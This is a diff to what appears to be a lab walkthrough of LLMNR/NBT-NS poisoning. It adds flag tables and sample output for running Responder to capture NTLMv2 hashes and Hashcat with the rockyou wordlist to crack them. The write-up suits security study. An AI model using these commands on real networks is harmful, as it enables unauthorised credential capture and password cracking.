@@ -82,8 +82,8 @@ If the password is weak, the captured hash can be cracked offline using a tool l
 
 | Tool | Purpose |
 |------|---------|
-| Responder | Captures `NTLMv2` hashes by responding to `LLMNR`, `NBT-NS`, and `mDNS` requests |
-| Hashcat | Cracks captured `NTLMv2` password hashes using a wordlist |
+| `Responder` | Captures `NTLMv2` hashes by responding to `LLMNR`, `NBT-NS`, and `mDNS` requests |
+| `Hashcat` | Cracks captured `NTLMv2` password hashes using a wordlist |
 
 ## Prerequisites
 
@@ -104,12 +104,30 @@ Before starting Responder, I first identified my network interface name and IP a
 ```bash
 ip a
 ```
+**Flag Breakdown**
+
+|    Flag   |     Meaning       |
+|-----------|-------------------|
+| `ip`      | The tool itself, used to show and manage network interfaces, addresses, and routing on Linux |
+| `a`       | Short for `address`, shows IP addresses assigned to all network interfaces                   |
 
 **Output:**
 
 ```
-eth0: 192.168.5.128
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:0c:29:77:a3:b1 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.5.128/24 brd 192.168.5.255 scope global dynamic noprefixroute eth0
+       valid_lft 1773sec preferred_lft 1773sec
+    inet6 fe80::f0be:d0bb:2c16:64f0/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
 ```
+
 <p align="center">
   <img src="/Active-Directory/01-llmnr-poisoning/images/step1.png" width="600">
 </p>
@@ -121,6 +139,7 @@ After identifying my network interface, I launched Responder to listen for LLMNR
 ```bash
 sudo responder -I eth0 -dwv
 ```
+**Flag Breakdown**
 
 |    Flag   |     Meaning       |
 |-----------|-------------------|
@@ -129,7 +148,21 @@ sudo responder -I eth0 -dwv
 |    `-w`     | WPAD proxy server |
 |    `-v`     | Verbose mode      |
 
-Responder will now listen on the network and wait for someone to broadcast a name request.
+**Output:**
+
+```
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+
+[+] Generic Options:
+    Responder IP               [192.168.5.128]
+
+[+] Listening for events...
+```
+
+Responder is now running and waiting for LLMNR, NBT-NS, and WPAD requests from devices on the network. When a victim sends a name resolution request, Responder can respond and capture the NTLM authentication information.
 
 <p align="center">
   <img src="/Active-Directory/01-llmnr-poisoning/images/step2.png" width="600">
@@ -220,6 +253,7 @@ After saving the NTLMv2 hash, I used Hashcat with the RockYou wordlist to try an
 ```bash
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+**Flag Breakdown**
 
 ```
 |             Flag                 |                   Meaning                     |
